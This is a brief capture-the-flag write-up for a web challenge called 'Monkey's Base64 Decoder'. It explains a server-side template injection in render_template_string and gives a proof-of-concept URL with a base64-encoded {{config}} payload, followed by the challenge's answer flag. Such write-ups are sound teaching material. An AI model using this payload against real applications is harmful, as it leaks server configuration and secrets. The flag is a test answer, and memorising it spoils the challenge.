# Monkey's Base64 Decoder #
 
## Overview ##
 
200 points
 
Author: sealldev
 
## Description ##
 
Monkey made their own base64 decoder!

## Solution ##
SSTI via the `render_template_string` can be found in `{{config}}`.
PoC: `/?b64=e3tjb25maWd9fQ==`

## Answer Flag ##
ApeCTF{sst1_t1m3_w00h00}

